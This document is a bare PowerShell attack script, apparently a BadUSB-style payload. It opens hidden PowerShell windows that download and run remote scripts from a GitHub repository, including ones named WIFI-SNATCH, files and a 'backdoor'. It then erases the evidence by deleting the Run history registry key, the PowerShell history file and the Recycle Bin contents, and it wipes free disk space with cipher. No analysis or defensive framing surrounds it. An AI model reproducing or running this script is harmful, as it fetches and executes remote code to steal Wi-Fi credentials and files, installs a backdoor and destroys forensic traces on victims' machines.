





start powershell -argumentlist '-windowstyle hidden $task1 = iwr https://github.com/skekic16/lol/raw/main/task1.ps1?dl=1; invoke-expression $task1'
start powershell -argumentlist '-windowstyle hidden $task2 = iwr https://github.com/skekic16/lol/raw/main/task2.ps1?dl=1; invoke-expression $task2'
start powershell -argumentlist '-windowstyle hidden $px = iwr https://github.com/skekic16/lol/raw/main/DP.ps1?dl=1; invoke-expression $px'
start powershell -argumentlist '-windowstyle hidden $pg = iwr https://github.com/skekic16/lol/raw/main/WIFI-SNATCH.ps1?dl=1; invoke-expression $pg'
start powershell -argumentlist '-windowstyle hidden $pw = iwr https://github.com/skekic16/lol/raw/main/files.ps1?dl=1; invoke-expression $pw'

start powershell -argumentlist '-windowstyle hidden $backdoor = iwr https://github.com/skekic16/lol/raw/main/BPC.ps1?dl=1; invoke-expression $backdoor'





start-sleep 60

function Clean-Exfil { 

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

Remove-Item (Get-PSreadlineOption).HistorySavePath

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}
Clean-Exfil
start powershell -argumentlist '-windowstyle hidden cipher /w:c'
Remove-Item (Get-PSreadlineOption).HistorySavePath
cls
exit
